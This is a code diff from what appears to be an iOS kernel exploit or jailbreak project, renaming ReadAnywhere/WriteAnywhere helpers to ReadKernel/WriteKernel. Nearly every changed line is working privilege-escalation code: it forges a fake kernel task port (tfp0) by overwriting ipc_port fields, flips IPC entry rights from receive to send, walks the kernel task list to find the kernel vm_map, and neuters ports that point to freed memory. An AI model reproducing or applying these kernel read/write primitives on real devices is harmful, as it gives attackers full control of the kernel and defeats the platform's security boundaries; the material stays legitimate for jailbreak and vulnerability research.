@@ -377,7 +377,7 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   kmemcpy(fake_kernel_task_kaddr, (uint64_t) fake_kernel_task, 0x1000);
   free(fake_kernel_task);
   
-  uint32_t fake_task_refs = ReadAnywhere32(fake_kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT));
+  uint32_t fake_task_refs = ReadKernel32(fake_kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT));
   LOG("read fake_task_refs: %x\n", fake_task_refs);
   if (fake_task_refs != 0xd00d) {
     LOG("read back value didn't match...\n");
@@ -386,21 +386,21 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   // now make the changes to the port object to make it a task port:
   uint64_t port_kaddr = find_port_address(tfp0, MACH_MSG_TYPE_MAKE_SEND);
   
-  WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
-  WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
-  WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
-  WriteAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
-  WriteAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  fake_kernel_task_kaddr);
+  WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
+  WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
+  WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
+  WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
+  WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  fake_kernel_task_kaddr);
   
   // swap our receive right for a send right:
   uint64_t task_port_addr = task_self_addr();
-  uint64_t task_addr = ReadAnywhere64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-  uint64_t itk_space = ReadAnywhere64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
-  uint64_t is_table = ReadAnywhere64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+  uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+  uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
   
   uint32_t port_index = tfp0 >> 8;
   const int sizeof_ipc_entry_t = 0x18;
-  uint32_t bits = ReadAnywhere32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
+  uint32_t bits = ReadKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
 
 #define IE_BITS_SEND (1<<16)
 #define IE_BITS_RECEIVE (1<<17)
@@ -408,7 +408,7 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   bits &= (~IE_BITS_RECEIVE);
   bits |= IE_BITS_SEND;
   
-  WriteAnywhere32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
+  WriteKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
   
   LOG("about to test new tfp0\n");
   
@@ -434,19 +434,19 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
 
 // task_self_addr points to the struct ipc_port for our task port
 uint64_t find_kernel_vm_map(uint64_t task_self_addr) {
-  uint64_t struct_task = ReadAnywhere64(task_self_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  uint64_t struct_task = ReadKernel64(task_self_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
   
   while (struct_task != 0) {
-    uint64_t bsd_info = ReadAnywhere64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+    uint64_t bsd_info = ReadKernel64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
     
-    uint32_t pid = ReadAnywhere32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+    uint32_t pid = ReadKernel32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
     
     if (pid == 0) {
-      uint64_t vm_map = ReadAnywhere64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
+      uint64_t vm_map = ReadKernel64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
       return vm_map;
     }
     
-    struct_task = ReadAnywhere64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
+    struct_task = ReadKernel64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
   }
   
   LOG("unable to find kernel task...\n");
@@ -665,23 +665,23 @@ mach_port_t get_kernel_memory_rw() {
   LOG("about to clear up\n");
   
   // can now clean everything up
-  WriteAnywhere32(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_NONE);
-  WriteAnywhere64(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  0);
+  WriteKernel32(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_NONE);
+  WriteKernel64(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  0);
   
   // first port will soon point to freed memory, so neuter it:
   uint64_t task_port_addr = task_self_addr();
-  uint64_t task_addr = ReadAnywhere64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-  uint64_t itk_space = ReadAnywhere64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
-  uint64_t is_table = ReadAnywhere64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+  uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+  uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
   
   uint32_t port_index = first_port >> 8;
   const int sizeof_ipc_entry_t = 0x18;
   
   // remove all rights
-  WriteAnywhere32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
+  WriteKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
   
   // clear the ipc_port port too
-  WriteAnywhere64(is_table + (port_index * sizeof_ipc_entry_t), 0);
+  WriteKernel64(is_table + (port_index * sizeof_ipc_entry_t), 0);
   
   mach_port_destroy(mach_task_self(), second_replacement_port);
   LOG("cleared up\n");
